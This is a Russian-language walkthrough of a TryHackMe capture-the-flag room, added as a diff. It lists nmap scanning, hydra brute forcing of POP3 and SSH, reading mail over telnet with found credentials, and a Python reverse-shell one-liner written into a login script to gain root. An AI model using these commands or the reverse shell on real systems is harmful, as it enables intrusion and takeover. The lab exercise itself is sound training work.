@@ -1,0 +1,34 @@
+https://tryhackme.com/room/ctf
+1) nmap -A -sV -O <IP-machine>
+обнаруживаю 110/tcp open  pop3 это telnet\
+
+2)забиваю сайт в интернете и мне выходит 
+https://pastebin.com/NrAqVeeX
+где размещены логины и зашифрованные пароли
+
+3)закинув в один файл логины, в другой расшифрованные пароли с помощью гидры нахожу пароль
+└─# hydra -L /root/Desktop/us.txt -P /root/Desktop/pass.txt  pop3://<IP-machine>
+
+окей нашла логин и пароль, теперь подключаюсь по telnet
+
+4) telnet <IP-machine> 110(порт на котором telnet)
+user seina
+
+pass scoobydoo2
+
+list    так понимаю = lists
+
+retr 1,2(чиатю сообщения)
+
+в одном сообщению читаю смена пароля на S1ck3nBluff+secureshell у какого-то аккаунта оки-доки
+
+5)└─# hydra -L /root/Desktop/us.txt -p S1ck3nBluff+secureshell  ssh://10.10.103.71
+нашла логин, живем-живем
+
+6) nano /opt/cube/cube.sh
+и вставляю в него 
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-machine>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+и в то же время на своем пк 
+└─# nc -lvnp 1234   
+
+перезахожу в ssh и вуаля теперь через nc у меня есть доступ к root
